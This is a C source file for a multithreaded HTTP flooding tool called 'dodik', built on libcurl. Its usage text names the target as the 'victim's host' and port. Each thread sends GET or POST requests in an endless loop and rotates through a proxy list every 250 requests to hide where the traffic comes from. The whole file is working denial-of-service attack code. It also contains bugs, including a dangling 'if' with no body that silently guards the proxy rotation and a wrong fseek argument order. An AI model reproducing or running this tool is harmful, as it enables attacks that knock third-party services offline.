#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <curl/curl.h>

struct data {
	char const *host;
	char const *port;
	char const *method;
	FILE *proxy;
	int timeout;
};

size_t writefunction(char *buffer, size_t size, size_t nitem, void *n);

void *threadSend(void *args);

int main(int const argc, char const **argv)
{
	if (argc < 5) {
		printf("\nError: too few arguments\n");
		printf("\nUsage: dodik [opt1] [value1] [opt2] [value2] ... \n\n");
		printf("Option\tDescrhosttion\n");
		printf("  -h  \t(MUST BE) Victim's host with (optional)protocol; Example: \"https://example.org\", \"https://\" - protocol; protocol def.val.=\"http://\"\n");
		printf("  -p  \t(MUST BE) Victim's port\n");
		printf("  -t  \t(optional) Count threads; def.val.=1\n");
		printf("  -m  \t(optioanl) Method of request (GET/POST); def.val.=\"GET\"\n");
		printf("  -pl \t(optional) List of proxy; format: protocol://address:port\n");
		printf("  -s  \t(optional) Interval between sending packages; def.val.=0\n\n");
		exit(EXIT_FAILURE);
	}
	
	// Declaring variables
	int count_threads = 1;
	pthread_t *thread_arr = (pthread_t *)malloc(sizeof(pthread_t) * count_threads);
	struct data args = {0};
	args.host = NULL;
	args.port = NULL;
	args.method = "GET";
	args.proxy = NULL;
	args.timeout = 0;
	
	// Argument handling
	for (int i = 1; i < argc - 1; i+=2) {
		if (strcmp(argv[i], "-h") == 0)
			args.host = argv[i + 1];
		else if (strcmp(argv[i], "-p") == 0)
			args.port = argv[i + 1];
		else if (strcmp(argv[i], "-t") == 0) {
			free(thread_arr);
			count_threads = atoi(argv[i + 1]);
			thread_arr = (pthread_t *)malloc(sizeof(pthread_t) * count_threads);
		}
		else if (strcmp(argv[i], "-m") == 0)
			args.method = argv[i + 1];
		else if (strcmp(argv[i], "-pl") == 0) {
			if (args.proxy != NULL)
				fclose(args.proxy);
			args.proxy = fopen(argv[i + 1], "r");
		}
		else if (strcmp(argv[i], "-s") == 0)
			args.timeout = atoi(argv[i + 1]);
	}
	
	// Checking must haves variables
	if (args.host == NULL || args.port == NULL) {
		if (args.host == NULL)
			printf("Error: you didn't enter host-address\n");
		if (args.port == NULL)
			printf("Error: you didn't enter port\n");
		free(thread_arr);
		exit(EXIT_FAILURE);
	}

	// Creating threads
	for (int i = 0; i < count_threads; i++)
		pthread_create(thread_arr + i, NULL, threadSend, (void *) &args);

	// Launch threads
	for (int i = 0; i < count_threads; i++)
		pthread_join(thread_arr[i], NULL);

	free(thread_arr); // freeing allocated memory
	
	return 0;
}

size_t writefunction(char *buffer, size_t size, size_t nitem, void *n)
{
	return 0;
}

void *threadSend(void *args)
{
	char *buffer[128] = {0};
	
	char const *host = ((struct data *) args)->host;
	char const *port = ((struct data *) args)->port;
	char const *method = ((struct data *) args)->method;
	int timeout = ((struct data *) args)->timeout;
	FILE *proxy = ((struct data *) args)->proxy;
	
	if (((struct data *) args)->proxy != NULL) {
		if (fscanf(proxy, "%s", buffer) == EOF) {
			fseek(proxy, SEEK_SET, 0);
			fscanf(proxy, "%s", buffer);
		}
	}

	CURL *curl = NULL;
	curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, host);
	curl_easy_setopt(curl, CURLOPT_PORT, atoi(port));
	if (proxy != NULL)
		curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
	if (strcmp(method, "POST") == 0) {
		curl_easy_setopt(curl, CURLOPT_POST, 1L);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "data=true&name=anon");
	}
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunction);
	curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);

	int i = 1;
	while (1) {
		curl_easy_perform(curl);
		if (strcmp(method, "random") == 0)
			
		if (proxy != NULL && i == 250) {
			if (fscanf(proxy, "%s", buffer) == EOF) {
				fseek(proxy, SEEK_SET, 0);
				fscanf(proxy, "%s", buffer);
			}
			curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
			i = 0;
		}
		i++;
	}
}
